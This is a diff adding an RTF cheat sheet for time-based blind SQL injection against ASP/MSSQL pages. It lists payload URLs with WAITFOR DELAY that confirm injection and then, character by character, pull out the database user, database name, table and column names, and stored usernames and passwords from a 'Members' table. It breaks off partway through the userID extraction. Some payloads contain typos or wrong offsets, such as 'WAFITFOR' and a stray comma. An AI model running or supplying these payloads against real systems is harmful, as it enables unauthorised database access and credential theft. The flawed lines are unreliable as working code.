@@ -1,0 +1,707 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fnil\fcharset0 Calibri;\f1\fswiss\fcharset0 ArialMT;\f2\fmodern\fcharset0 CourierNewPSMT;
+\f3\froman\fcharset0 TimesNewRomanPSMT;\f4\fnil\fcharset0 LucidaGrande;\f5\ftech\fcharset0 Wingdings-Regular;
+}
+{\colortbl;\red255\green255\blue255;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww16100\viewh9620\viewkind0
+\deftab720
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0\b\fs26 \cf1 \cb0 \expnd0\expndtw0\kerning0
+TIME-BASED Injection - Vulnerability Testing:\
+
+\f1\b0 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 INTEGER: http://[site]/page.asp?id=1; WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x'; WAITFOR DELAY '00:00:10'--+- (+10 seconds)
+\b \
+\
+	HINT: WHEN LOOKING FOR A CHAR USE > TO FIND IF IT IS A A-Z, a-z OR 1-9\
+\
+TIME-BASED Extraction of CURRENT DATABASE USER\
+
+\f1\b0 \
+
+\f0 Determine Length of USER:
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(USER)=4) WAITFOR DELAY '00:00:10'--
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(USER)=5) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Result = 5 characters in length
+\f1 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0 Determine length, and then try to find out CHAR value one character position at a time, like this:
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))>96) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))>100) WAITFOR DELAY '00:00:10'--
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))>98) WAITFOR DELAY '00:00:10'--
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1))=97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Result = the first character CHAR value is 97 which is an \'93a\'94
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))>99) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Result = the second character CHAR value is 100 which is a \'93d\'94
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))>108) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'\'97
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Result = third character CHAR value is 109 which is the letter \'93m\'94
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),4,1)))>104) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),4,1)))=105) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Result = the fourth character CHAR value is 105 which is an \'93i\'94
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),5,1)))>109) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),5,1)))=110) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 the fifth character position has CHAR value of 110 which is the letter \'93n\'94\
+
+\f1 \
+
+\f0 Database User = 97,100,109,105,110 = admin\
+
+\f1 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b TIME-BASED Extraction of CURRENT DATABASE NAME\
+
+\f1\b0 \
+
+\f0 This follows the same method as used above to grab the USER, but we will change the reference to DB_NAME(). Again, we will need to check the length first and then to use the LIMIT to move from one character position to the next until we have captured all values and then convert. It looks like this:
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(DB_NAME())=6) WAFITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=116) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),2,1)))=101) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),3,1)))=115) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),4,1)))=116) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),5,1)))=68) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),6,1)))=66) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Database Name = 116,101,115,116,68,66 = testDB
+\f1 \
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b TIME-BASED Extraction of 1
+\fs22 \super st
+\fs26 \nosupersub  TABLE IN DB:\
+
+\f1\b0 \
+
+\f0 This will get the first table name of the current database.
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=7) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+	if (len(sElEcT tOp 1 nAmE from sysobjects where xtype=char(85))>5) waitfor delay '00:00:10'--
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Result = DBNAME of 7 characters in length
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f5 \cf1 \'a7
+\f3 \'a0 
+\f0 Remember you can use greater than or less than symbols to help narrow things down when starting from the unknown
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=77) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),2,1)))=101) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),3,1)))=109) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),4,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),5,1)))=101) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),5,1)))=114) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),5,1)))=115) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 \
+Table Name =77,101,109,98,101,114,115 = Members
+\f1 \
+
+\f0\b \
+TIME-BASED Extraction of 2
+\fs22 \super nd
+\fs26 \nosupersub  TABLE IN DB:
+\f1\b0 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>\'92Members\'92)=6) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) 
+\b and
+\b0  
+\b name>'Members'
+\b0 ),1,1)))=106) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>'Members'),2,1)))=117) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>'Members'),3,1)))=105) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>'Members'),4,1)))=99) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>'Members'),5,1)))=121) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>'Members'),6,1)))=49) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 \
+Table Name = 106,117,105,99,121,49 = juicy1
+\f1 \
+\
+
+\f0\b NOTE
+\b0 : Increment and replace the referenced table in the first request to get additional table names, meaning the next request would look something like this:
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) 
+\b and name>'juicy1'
+\b0 ),1,1)))=65) WAITFOR DELAY '00:00:10'--
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+\cf1 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b TIME-BASED Extraction of 1
+\fs22 \super st
+\fs26 \nosupersub  TABLE COLUMNS:
+\f1\b0 \
+
+\f0 Now that you have figured out the database name and first table name let\'92s enumerate some columns from the table(s) we found. It will look like this for the first column from the first table:
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members')=4) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Remember to help you out and speed things up you can check the length before you start testing away
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members'),1,1)))=117) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members'),1,1)))=115) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members'),1,1)))=101) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members'),1,1)))=114) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Column Name = 117,115,101,114 = user\
+
+\f1 \
+
+\f0\b TIME-BASED Extraction of 2
+\fs22 \super nd
+\fs26 \nosupersub  COLUMN NAME
+\b0 :\
+
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'user')=4) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Length check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'user'),1,1)))=80) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'user'),2,1)))=65) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'user'),3,1)))=83) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'user'),4,1)))=83) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Column Name = 80,65,83,83 = PASS\
+
+\f1 \
+
+\f0\b TIME-BASED Extraction of 3
+\fs22 \super rd
+\fs26 \nosupersub  COLUMN NAME:\
+
+\f1\b0 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>,'PASS')=6) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Length Check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'PASS'),1,1)))=117) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'PASS'),2,1)))=115) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'PASS'),3,1)))=101) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'PASS'),4,1)))=114) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'PASS'),5,1)))=73) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='Members' and column_name>'PASS'),6,1)))=68) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 \
+Column Name = 117,115,101,114,73,68 = userID
+\f1 \
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b TIME-BASED Extraction of Data:
+\f1\b0 \
+
+\f0 We will be extracting information now that we have gotten the table (Members) and column names (user, PASS, & userID), from the current database (testDB). We will unfortunately need to extract the results one field at a time. In order to get the first field (user) from the Members table starting on row 1 we would do this: \'a0
+\f1 \
+\
+
+\f3  
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 user from Members)=5) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 Length Check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 user from Members),1,1))=97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 user from Members),2,1))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 user from Members),3,1))=109) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 user from Members),4,1))=105) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 user from Members),5,1))=110) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Results for first user entry = 97,100,109,105,110 = admin
+\f1 \
+\
+
+\f0\b Now to get the next column
+\b0 :
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 PASS from Members)=4) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Length Check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from Members),1,1))=112) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from Members),2,1))=97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from Members),3,1))=115) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from Members),3,1))=115) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\
+
+\f0 Results = 112, 97, 115, & 115 = pass
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+\cf1 \
+
+\f0\b Now to get the userID:
+\f1\b0 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 userID from Members)=1) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Length Check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
